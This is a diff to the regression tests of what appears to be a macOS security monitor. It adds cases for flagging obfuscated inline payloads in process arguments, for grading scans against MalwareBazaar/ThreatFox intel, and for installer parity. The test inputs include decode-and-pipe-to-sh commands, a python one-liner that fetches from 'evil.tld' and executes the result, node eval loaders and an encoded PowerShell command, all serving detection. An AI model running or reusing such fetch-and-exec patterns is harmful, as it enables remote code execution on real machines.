@@ -10,7 +10,9 @@ finding it pins and would FAIL against the pre-fix code.
 Run:  python3 -m unittest discover -s tests        (from the repo root)
   or: python3 tests/test_regression.py
 """
+import base64
 import contextlib
+import hashlib
 import io
 import json
 import os
@@ -180,6 +182,19 @@ class Sandbox(unittest.TestCase):
             "CANARY_STATE": os.path.join(self.state, "canaries.json"),
             # vt_key must be sandboxed so no test reads or writes the real key.
             "VT_KEY_FILE": os.path.join(self.state, "vt_key"),
+            # Community-intel artifacts (aegis.py intel …). Pinned so a real
+            # feed the developer fetched into ~/.aegis/intel can never plant
+            # nondeterministic CRITICAL findings into scan-level tests. The
+            # parsed-set cache is reset for the same reason, in both
+            # directions: no test may see the real sets, and no later test may
+            # see a stale sandboxed set (the mtime-keyed cache would otherwise
+            # outlive tearDown's path restore).
+            "INTEL_DIR": os.path.join(self.state, "intel"),
+            "INTEL_BAZAAR_FILE": os.path.join(self.state, "intel",
+                                              "malwarebazaar.json"),
+            "INTEL_THREATFOX_FILE": os.path.join(self.state, "intel",
+                                                 "threatfox.json"),
+            "_INTEL_CACHE": None,
             # The listener surface shells to lsof (live host state). Point it
             # at /usr/bin/true (rc 0, no output ⇒ empty snapshot) so scan-level
             # tests are deterministic; listener tests call the parse/diff
@@ -1109,6 +1124,117 @@ class TestArgvSignals(Sandbox):
         # `s{(rm|node|perl)}` must NOT trip pipe-to-interpreter (live-host FP fix).
         sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
         self.assertNotIn("pipe-to-interpreter", [n for n, _ in sigs], sigs)
+
+
+# --------------------------------------------------------------------------- #
+# N14b — obfuscated-payload argv tier: an interpreter's inline-code flag
+# carrying an ENCODED payload the idiom tables have never seen. Gate 1
+# (interpreter + code-exec flag) is mandatory so arbitrary processes — Electron
+# helpers, JWTs, cloud CLIs with giant opaque argv — are structurally out of
+# scope; gate 2 is a long high-entropy base64-alphabet blob that really
+# decodes, or an in-process decode+execute composition. MEDIUM alone (below
+# the notify floor, corroboration fodder); HIGH only when the same argv also
+# carries a fetch or feeds the blob into a recognized exec sink.
+# --------------------------------------------------------------------------- #
+class TestObfuscatedArgvPayload(Sandbox):
+    # Deterministic pseudo-random payload: 160 bytes -> 216 base64 chars,
+    # entropy ~5.8 bits/char, decodes. os.urandom would test the same thing
+    # non-reproducibly.
+    BLOB = base64.b64encode(b"".join(
+        hashlib.sha256(bytes([i])).digest() for i in range(5))).decode()
+
+    def _sigs(self, argv):
+        return dict(aegis._argv_signals(argv))
+
+    def test_bash_c_blob_piped_to_sh_is_high(self):
+        # decode a >=100-char embedded blob straight into `sh` — the packed
+        # variant of the fileless pipeline; the blob feeds a recognized exec
+        # sink, so it is notify-grade even with no fetch in sight.
+        sigs = self._sigs('bash -c "echo %s | base64 -d | sh"' % self.BLOB)
+        self.assertEqual(sigs.get("obfuscated-inline-payload"), "HIGH", sigs)
+
+    def test_bash_c_bare_blob_is_medium_below_notify(self):
+        # blob with NO fetch and NO exec sink: recorded corroboration only.
+        sigs = self._sigs('bash -c "echo %s > /tmp/staged"' % self.BLOB)
+        self.assertEqual(sigs.get("obfuscated-inline-payload"), "MEDIUM", sigs)
+        top = max(aegis.SEV_ORDER[s] for s in sigs.values())
+        self.assertLess(top, aegis.SEV_ORDER["HIGH"], sigs)
+
+    def test_node_eval_buffer_short_blob_is_loader_medium(self):
+        # the HexEval shape with a blob too short for the entropy gate: the
+        # decode+execute COMPOSITION is the signal (argv twin of the supply-
+        # chain js-encoded-loader), still below the notify floor alone.
+        sigs = self._sigs(
+            "node -e eval(Buffer.from('%s','base64').toString())"
+            % self.BLOB[:60])
+        self.assertEqual(sigs.get("argv-encoded-loader"), "MEDIUM", sigs)
+
+    def test_running_node_encoded_loader_process_fires(self):
+        # a RUNNING same-user node process carrying the full loader argv must
+        # produce a behavior finding through the real check_behavior path.
+        real = self._saved["check_behavior"]
+        argv = ("/usr/local/bin/node -e "
+                "eval(Buffer.from('%s','base64').toString())" % self.BLOB)
+        fake = [("4242", aegis._own_owner(), "/usr/local/bin/node", argv)]
+        saved = aegis._iter_processes
+        aegis._iter_processes = lambda: iter(fake)
+        try:
+            fs = real()
+        finally:
+            aegis._iter_processes = saved
+        hits = [f for f in fs if f["category"] == "behavior"
+                and "argv-encoded-loader" in f.get("markers", ())]
+        self.assertTrue(hits, fs)
+        # full-length blob + eval() exec sink -> notify-grade.
+        self.assertEqual(hits[0]["severity"], "HIGH", hits)
+
+    def test_fetch_plus_decode_is_high(self):
+        sigs = self._sigs(
+            'python3 -c "import urllib.request,base64;'
+            "exec(base64.b64decode(urllib.request.urlopen("
+            "'https://evil.tld/p').read()))\"")
+        self.assertEqual(sigs.get("argv-encoded-loader"), "HIGH", sigs)
+
+    def test_powershell_enc_yields_single_strongest_signal(self):
+        # `-enc <blob>` is already the powershell-encoded-command idiom (HIGH,
+        # unambiguous): one argv, one strongest signal — the obfuscation tier
+        # must not double-report the same blob.
+        sigs = self._sigs("powershell -NoProfile -enc %s" % self.BLOB)
+        self.assertEqual(sigs.get("powershell-encoded-command"), "HIGH", sigs)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_plain_python_oneliner_is_silent(self):
+        self.assertEqual(aegis._argv_signals('python3 -c "print(1+1)"'), [])
+
+    def test_long_low_entropy_english_arg_is_silent(self):
+        arg = "pleasewaitwhilewedownloadyourpackagesandrebuildthecaches" * 4
+        sigs = self._sigs('bash -c "echo %s"' % arg)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_uuid_path_run_is_not_a_blob(self):
+        # Found on the real process table: a harness `bash -c` whose argv
+        # embeds a long tmp path with hex-UUID segments clears the entropy
+        # floor (measured 4.84). The structural tell is the alphabet mix —
+        # '/' (std base64) together with '-' (base64url) decodes under no
+        # base64 flavor, so a path can never pass _b64_decodable.
+        path = ("/private/tmp/claude-501/-Users-charlie-Documents-Work---"
+                "Projects/b2b95d18-f83a-481f-bced-b3bb7799cea0/scratchpad/"
+                "run-4ac5698e761166b1da2a57cc80e/out")
+        sigs = self._sigs('bash -c "python3 %s 2>/dev/null || true"' % path)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_electron_giant_flags_structurally_unscored(self):
+        # no code-exec flag -> gate 1 never opens, whatever the arg entropy.
+        argv = ("/Applications/Chat.app/Contents/Frameworks/Chat Helper "
+                "(Renderer).app/Contents/MacOS/Chat Helper (Renderer) "
+                "--type=renderer --enable-features=WebRTCPipeWireCapturer "
+                "--service-request-token=%s" % self.BLOB)
+        self.assertEqual(aegis._argv_signals(argv), [])
+
+    def test_opaque_cli_token_unscored(self):
+        # cloud CLIs legitimately pass giant opaque args; no inline-code flag.
+        self.assertEqual(aegis._argv_signals(
+            "aws s3 cp --sse-customer-key %s s3://bkt/key ./f" % self.BLOB), [])
 
 
 # --------------------------------------------------------------------------- #
@@ -2282,6 +2408,298 @@ class TestVTReputation(Sandbox):
         self.assertEqual(seen["key"], "secret")
 
 
+class _FakeFeedResp:
+    """Minimal urlopen()-shaped response for the intel transport stub."""
+
+    def __init__(self, payload):
+        self._payload = payload
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *a):
+        return False
+
+    def read(self, n=-1):
+        return self._payload if n is None or n < 0 else self._payload[:n]
+
+
+# --------------------------------------------------------------------------- #
+# Community IOC intel (`aegis.py intel …`) — the opt-in, by-hand feed layer.
+# Doctrine mirror of the vt tests above: `intel update` is the only half that
+# may touch the network (stubbed here, both feed formats exercised from
+# fixtures), and the scan path only ever GRADES the local copy — proven
+# structurally by running a full scan with the transport booby-trapped to
+# explode. No intel fetched ⇒ the surface is absent, never degraded.
+# --------------------------------------------------------------------------- #
+class TestIntelFeeds(Sandbox):
+    SHA_BAZAAR = "11" * 32
+    SHA_TF = "33" * 32
+    C2 = "185.10.9.3:4444"
+
+    def _bazaar_text(self, sha=None):
+        sha = sha or self.SHA_BAZAAR
+        return (
+            "################################################################\n"
+            "# MalwareBazaar recent malware samples (SHA256 hashes)         #\n"
+            "# Last updated: 2026-08-11 13:43:48 UTC                        #\n"
+            "################################################################\n"
+            "#\n"
+            "# sha256_hash\n"
+            + sha + "\n"
+            + "not-a-hash\n"
+            + sha.upper() + "\n"          # duplicate (case-folded) → one entry
+            + "22" * 32 + "\n")
+
+    def _threatfox_json(self, sha=None, c2=None):
+        """The real export shape: dict of id → list of IOC rows, plus garbage
+        groups/rows that must be skipped, never raised on."""
+        sha = sha or self.SHA_TF
+        return json.dumps({
+            "1872298": [{
+                "ioc_value": c2 or self.C2, "ioc_type": "ip:port",
+                "threat_type": "botnet_cc", "malware": "win.cobalt_strike",
+                "malware_printable": "Cobalt Strike",
+                "first_seen_utc": "2026-08-01 00:00:00",
+                "confidence_level": 100}],
+            "1872299": [{
+                "ioc_value": "j4lpcxth.en-us-slimsounds.example",
+                "ioc_type": "domain", "malware_printable": "ClearFake",
+                "first_seen_utc": "2026-08-11 14:08:51"}],
+            "1872300": [{
+                "ioc_value": sha, "ioc_type": "sha256_hash",
+                "malware_printable": "AMOS",
+                "first_seen_utc": "2026-08-02 12:00:00"}],
+            "1872301": ["garbage", 42, {"ioc_value": 5, "ioc_type": "ip:port"}],
+            "1872302": "not-a-list",
+        })
+
+    def _stub_transport(self, mapping):
+        """Route urlopen by URL fragment to fixture bytes or an exception."""
+        import urllib.request
+
+        def fake_urlopen(req, timeout=0):
+            url = getattr(req, "full_url", req)
+            for frag, payload in mapping.items():
+                if frag in url:
+                    if isinstance(payload, Exception):
+                        raise payload
+                    return _FakeFeedResp(payload)
+            raise AssertionError("unexpected fetch: %s" % url)
+
+        saved = urllib.request.urlopen
+        urllib.request.urlopen = fake_urlopen
+        self.addCleanup(setattr, urllib.request, "urlopen", saved)
+
+    def _write_intel(self, hashes_list=(), tf_hashes=None, tf_net=None,
+                     bazaar_fetched=None, tf_fetched=None):
+        aegis.save_json(aegis.INTEL_BAZAAR_FILE, {
+            "feed": "MalwareBazaar", "fetched_at": bazaar_fetched or
+            aegis.now_iso(), "count": len(hashes_list),
+            "hashes": list(hashes_list)})
+        aegis.save_json(aegis.INTEL_THREATFOX_FILE, {
+            "feed": "ThreatFox", "fetched_at": tf_fetched or aegis.now_iso(),
+            "hashes": tf_hashes or {}, "net": tf_net or {}})
+
+    # --- intel update (by-hand fetch; transport always stubbed) -----------
+    def test_update_parses_both_feed_formats(self):
+        self._stub_transport({
+            "bazaar.abuse.ch": self._bazaar_text().encode(),
+            "threatfox.abuse.ch": self._threatfox_json().encode()})
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel("update"), 0)
+        bz = aegis.load_json(aegis.INTEL_BAZAAR_FILE, None)
+        self.assertIn(self.SHA_BAZAAR, bz["hashes"])
+        self.assertNotIn("not-a-hash", bz["hashes"])
+        self.assertEqual(bz["hashes"].count(self.SHA_BAZAAR), 1,
+                         "duplicate hashes must be folded to one entry")
+        self.assertTrue(bz.get("fetched_at"))
+        tf = aegis.load_json(aegis.INTEL_THREATFOX_FILE, None)
+        self.assertEqual(tf["hashes"][self.SHA_TF]["family"], "AMOS")
+        self.assertEqual(tf["net"][self.C2]["family"], "Cobalt Strike")
+        self.assertEqual(tf["net"][self.C2]["first_seen"],
+                         "2026-08-01 00:00:00")
+        # Privacy posture: hashes and ip:ports only — the feed's domains/URLs
+        # are never written to disk.
+        self.assertNotIn("slimsounds", json.dumps(tf))
+        if os.name == "posix":
+            for p in (aegis.INTEL_BAZAAR_FILE, aegis.INTEL_THREATFOX_FILE):
+                self.assertEqual(os.stat(p).st_mode & 0o777, 0o600)
+
+    def test_update_failure_keeps_prior_data_and_says_so(self):
+        self._write_intel(hashes_list=[self.SHA_BAZAAR],
+                          tf_net={self.C2: {"family": "Cobalt Strike",
+                                            "first_seen": None}})
+        self._stub_transport({"abuse.ch": OSError("connection refused")})
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel("update"), 1)
+        self.assertIn("prior", buf.getvalue().lower())
+        bz = aegis.load_json(aegis.INTEL_BAZAAR_FILE, None)
+        self.assertEqual(bz["hashes"], [self.SHA_BAZAAR],
+                         "a failed fetch must never clobber the prior copy")
+        tf = aegis.load_json(aegis.INTEL_THREATFOX_FILE, None)
+        self.assertIn(self.C2, tf["net"])
+
+    def test_garbage_feed_data_never_raises(self):
+        # Bytes that are neither valid text-export nor JSON must fail SOFT:
+        # non-zero exit, message, no artifact written.
+        self._stub_transport({"abuse.ch": b"\x00\xffgarbage{{{"})
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel("update"), 1)
+        self.assertFalse(os.path.exists(aegis.INTEL_BAZAAR_FILE))
+        self.assertFalse(os.path.exists(aegis.INTEL_THREATFOX_FILE))
+        # And the pure parsers never raise on hostile shapes.
+        self.assertEqual(aegis._parse_bazaar_sha256_export("#c\nzz\n\n"), [])
+        self.assertEqual(aegis._parse_threatfox_export(["x", 42, None]),
+                         ({}, {}))
+        self.assertEqual(
+            aegis._parse_threatfox_export(
+                {"1": ["y", {"ioc_value": 5, "ioc_type": "ip:port"}],
+                 "2": "zz", "3": None}),
+            ({}, {}))
+        self.assertEqual(aegis._parse_threatfox_export("a string"), ({}, {}))
+
+    def test_bad_action_prints_usage(self):
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel("bogus"), 1)
+        self.assertIn("usage", buf.getvalue())
+
+    # --- scan-path grading (offline, read-only) ----------------------------
+    def _plant_payload_and_persistence(self):
+        payload = os.path.join(self.tmp, "payload.sh")
+        with open(payload, "w") as f:
+            f.write("#!/bin/sh\necho evil\n")
+        rec = aegis._finish_persist_record(
+            aegis._persist_record(label="com.evil.updater"), payload, [payload])
+        saved = aegis.snapshot_persistence
+        aegis.snapshot_persistence = lambda: {"launchd:" + payload: rec}
+        self.addCleanup(setattr, aegis, "snapshot_persistence", saved)
+        return payload, aegis.sha256(payload)
+
+    def _booby_trap_network(self):
+        """The structural guarantee, enforced: ANY python-level network use
+        during the scan raises straight through the test."""
+        import socket
+        import urllib.request
+
+        def boom(*a, **k):
+            raise AssertionError("the scan path touched the network")
+
+        for mod, attr in ((urllib.request, "urlopen"),
+                          (socket, "create_connection"),
+                          (socket, "getaddrinfo")):
+            saved = getattr(mod, attr)
+            setattr(mod, attr, boom)
+            self.addCleanup(setattr, mod, attr, saved)
+
+    def test_scan_with_intel_present_never_touches_network_and_flags_hash(self):
+        payload, sha = self._plant_payload_and_persistence()
+        self._write_intel(hashes_list=[sha],
+                          tf_hashes={sha: {"family": "AMOS",
+                                           "first_seen": "2026-08-02 12:00:00"}})
+        self._booby_trap_network()
+        aegis.cmd_scan(quiet=True)  # must complete — no urlopen, no sockets
+        latest = aegis.load_json(aegis.LATEST_JSON, {})
+        hits = [f for f in latest.get("findings", [])
+                if f["category"] == "intel"]
+        self.assertEqual(len(hits), 1)
+        self.assertEqual(hits[0]["severity"], "CRITICAL")
+        self.assertIn("Known-malware hash", hits[0]["title"])
+        self.assertEqual(hits[0].get("sha256"), sha)
+        self.assertIn("AMOS", hits[0]["detail"])
+        self.assertIn("first seen", hits[0]["detail"])
+
+    def test_scan_with_non_matching_intel_stays_silent(self):
+        self._plant_payload_and_persistence()
+        self._write_intel(hashes_list=["44" * 32],
+                          tf_hashes={"55" * 32: {"family": "X",
+                                                 "first_seen": None}})
+        self._booby_trap_network()
+        aegis.cmd_scan(quiet=True)
+        latest = aegis.load_json(aegis.LATEST_JSON, {})
+        self.assertEqual([f for f in latest.get("findings", [])
+                          if f["category"] == "intel"], [])
+
+    def test_no_intel_files_means_surface_absent_not_degraded(self):
+        self._plant_payload_and_persistence()
+        self._booby_trap_network()
+        aegis.cmd_scan(quiet=True)
+        latest = aegis.load_json(aegis.LATEST_JSON, {})
+        self.assertEqual([f for f in latest.get("findings", [])
+                          if f["category"] == "intel"], [])
+        self.assertNotIn("intel", [h["sensor_id"]
+                                   for h in aegis.get_sensor_health()],
+                         "no intel ⇒ no sensor row at all (absent, not "
+                         "degraded)")
+
+    def test_findings_carrying_sha256_are_graded(self):
+        # The hot-dir/app-bundle route: any finding that already carries a
+        # sha256 is graded without re-hashing anything.
+        sha = "55" * 32
+        self._write_intel(tf_hashes={sha: {"family": "AMOS",
+                                           "first_seen": None}})
+        prior = [aegis.finding(
+            "HIGH", "hot-dir", "Unsigned executable in watched folder",
+            "detail", "fp1", sha256=sha, path="/x/y")]
+        fs = aegis.check_intel({}, prior)
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+        self.assertIn("ThreatFox", fs[0]["detail"])
+        # Robustness: malformed records and findings grade to nothing.
+        self.assertEqual(
+            aegis.check_intel({"k": "notadict", "j": {"sha256": None}},
+                              [{}, "x"]), [])
+
+    def test_outbound_connection_to_known_c2_is_critical(self):
+        self._write_intel(tf_net={self.C2: {"family": "Cobalt Strike",
+                                            "first_seen": "2026-08-01"}})
+        saved = aegis._outbound_rows
+        aegis._outbound_rows = lambda: [("/Users/me/payload",
+                                         "185.10.9.3", "4444")]
+        self.addCleanup(setattr, aegis, "_outbound_rows", saved)
+        fs = [f for f in aegis.check_outbound() if f["category"] == "intel"]
+        self.assertEqual(len(fs), 1)
+        self.assertEqual(fs[0]["severity"], "CRITICAL")
+        self.assertIn("Cobalt Strike", fs[0]["detail"])
+        self.assertEqual(fs[0].get("remote"), "185.10.9.3")
+        self.assertEqual(fs[0].get("port"), "4444")
+        # Control: a non-listed endpoint produces no intel finding.
+        aegis._outbound_rows = lambda: [("/Users/me/payload", "8.8.8.8",
+                                         "443")]
+        self.assertEqual([f for f in aegis.check_outbound()
+                          if f["category"] == "intel"], [])
+
+    # --- intel status -------------------------------------------------------
+    def test_status_reports_ages_counts_and_stale(self):
+        stale_ts = time.strftime("%Y-%m-%dT%H:%M:%S+00:00",
+                                 time.gmtime(time.time() - 10 * 86400))
+        self._write_intel(hashes_list=["22" * 32], bazaar_fetched=stale_ts,
+                          tf_net={self.C2: {"family": "Cobalt Strike",
+                                            "first_seen": None}})
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel("status"), 0)
+        out = buf.getvalue()
+        for line in out.splitlines():
+            if "MalwareBazaar" in line:
+                self.assertIn("STALE", line)
+                self.assertIn("1 ", line)  # entry count is reported
+            if "ThreatFox" in line:
+                self.assertNotIn("STALE", line)
+
+    def test_status_with_nothing_fetched_explains_opt_in(self):
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            self.assertEqual(aegis.cmd_intel(), 0)  # default action = status
+        out = buf.getvalue()
+        self.assertIn("not fetched", out)
+        self.assertIn("intel update", out)
+
+
 # --------------------------------------------------------------------------- #
 # install.sh smoke test — the installer had two CRITICAL bugs with zero coverage:
 #   F0   an unescaped '&' from a "…/Work & Projects/…" path → invalid plist XML →
@@ -2347,6 +2765,48 @@ class TestInstaller(unittest.TestCase):
         self.assertEqual(d["ProgramArguments"][2], "watch")
         self.assertTrue(d.get("KeepAlive"))
         self.assertNotIn("StartInterval", d)
+
+    # The README says `bash install.sh` and `aegis.py install` "do the same
+    # thing" on macOS. They did not: the Python port dropped the four resource
+    # keys install.sh has always written, so anyone following the cross-platform
+    # path — including the refresh line `update-check` prints — got a monitor
+    # with no niceness, no low-priority IO, and (in watch mode) no bound on
+    # KeepAlive respawn. Asserting PARITY rather than a hardcoded list is the
+    # point: whichever installer gains a resource key, the other must match.
+    _RESOURCE_KEYS = ("ProcessType", "LowPriorityIO", "Nice", "ThrottleInterval")
+
+    def _install_py(self, *args):
+        env = dict(os.environ)
+        env["HOME"] = self.home
+        env["PATH"] = self.bin + os.pathsep + env["PATH"]
+        env["AEGIS_TESTING"] = "1"
+        env["AEGIS_TEST_LAUNCHCTL"] = os.path.join(self.bin, "launchctl")
+        r = subprocess.run([sys.executable, os.path.join(self.repo, "aegis.py"),
+                            "install", *args],
+                           env=env, capture_output=True, text=True)
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+        plist = os.path.join(self.home,
+                             "Library/LaunchAgents/com.charlie.aegis.plist")
+        lint = subprocess.run(["plutil", "-lint", plist],
+                              capture_output=True, text=True)
+        self.assertIn("OK", lint.stdout, lint.stdout + lint.stderr)
+        with open(plist, "rb") as f:
+            return plistlib.load(f)
+
+    def test_both_installers_agree_on_the_resource_keys(self):
+        sh = self._install("3600")
+        py = self._install_py("3600")
+        for key in self._RESOURCE_KEYS:
+            with self.subTest(key=key):
+                self.assertIn(key, sh, "install.sh lost %s" % key)
+                self.assertIn(key, py, "aegis.py install lost %s" % key)
+                self.assertEqual(sh[key], py[key],
+                                 "%s differs between the two installers" % key)
+
+    def test_python_installer_throttles_keepalive_respawn(self):
+        py = self._install_py("watch", "600")
+        self.assertTrue(py.get("KeepAlive"))
+        self.assertEqual(py.get("ThrottleInterval"), 30)
 
     def test_rejects_non_numeric_interval(self):
         env = dict(os.environ)
